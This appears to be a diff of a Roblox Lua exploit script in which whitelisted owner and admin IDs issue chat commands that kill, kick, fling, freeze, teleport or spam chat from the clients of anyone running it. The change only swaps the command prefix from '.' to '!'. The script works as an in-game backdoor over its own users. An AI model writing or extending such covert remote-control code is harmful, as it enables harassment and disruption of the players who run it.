@@ -7,7 +7,7 @@ local whitelist = {owner ={1362310817},admin={4442310817}}
     end
     
         if admin or owner then
-        if message:sub(1, 6) == ".bring" then
+        if message:sub(1, 6) == "!bring" then
             if message:match(game.Players.LocalPlayer.Name) then
                 local info=TweenInfo.new(6,Enum.EasingStyle.Quad);
                 local plr = game.Players.LocalPlayer
@@ -15,7 +15,7 @@ local whitelist = {owner ={1362310817},admin={4442310817}}
             end
         end
         -- kill start
-        if message:sub(1, 5) == ".kill" then
+        if message:sub(1, 5) == "!kill" then
             if message:match(game.Players.LocalPlayer.Name) then
                 local plr = game.Players.LocalPlayer
                 game.Players.LocalPlayer.Character.Humanoid.Health = 0
@@ -23,7 +23,7 @@ local whitelist = {owner ={1362310817},admin={4442310817}}
         end
         --  kill end
         -- kick start
-        if message:sub(1, 5) == ".kick" then
+        if message:sub(1, 5) == "!kick" then
             if message:match(game.Players.LocalPlayer.Name) then
                 local plr = game.Players.LocalPlayer
                 game.Players.LocalPlayer:Kick("\nxd u was kicked by who though?. \n["..author.."]")
@@ -33,13 +33,13 @@ local whitelist = {owner ={1362310817},admin={4442310817}}
         
 
         
-        if message:sub(1, 9) == ".unfreeze" then
+        if message:sub(1, 9) == "!unfreeze" then
             if message:match(game.Players.LocalPlayer.Name) then
                 game.Players.LocalPlayer.Character.Head.Anchored = false
             end
         end
         
-        if message:sub(1, 5) == ".benx" then
+        if message:sub(1, 5) == "!benx" then
             if message:match(game.Players.LocalPlayer.Name) then
                 bending = true
                 local segtarget = author.Name
@@ -79,7 +79,7 @@ local whitelist = {owner ={1362310817},admin={4442310817}}
             end
         end
         
-        if message:sub(1, 7) == ".unbenx" then
+        if message:sub(1, 7) == "!unbenx" then
             if message:match(game.Players.LocalPlayer.Name) then
                 while bending == true do
                     wait()
@@ -88,7 +88,7 @@ local whitelist = {owner ={1362310817},admin={4442310817}}
             end
         end
         
-        if message:sub(1, 6) == ".fling" then
+        if message:sub(1, 6) == "!fling" then
             if message:match(game.Players.LocalPlayer.Name) then
                 local plr = game.Players.LocalPlayer
                 plr.Character.HumanoidRootPart.Velocity = Vector3.new(500000,500000,500000)
@@ -96,7 +96,7 @@ local whitelist = {owner ={1362310817},admin={4442310817}}
         end
     
         -- kick end
-        if message == ".users" then
+        if message == "!users" then
             if author ~= game.Players.LocalPlayer.Name then
                 local path = game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest
                 path:FireServer("SoftVortex Always on top"..author.."!","all")
@@ -106,7 +106,7 @@ local whitelist = {owner ={1362310817},admin={4442310817}}
         
             
     
-            if message:sub(1, 7) == ".rejoin" then
+            if message:sub(1, 7) == "!rejoin" then
                 if message:match(game.Players.LocalPlayer.Name) then
                     local TeleportService = game:GetService("TeleportService")
                     TeleportService:Teleport(2788229376, game.Players.LocalPlayer)
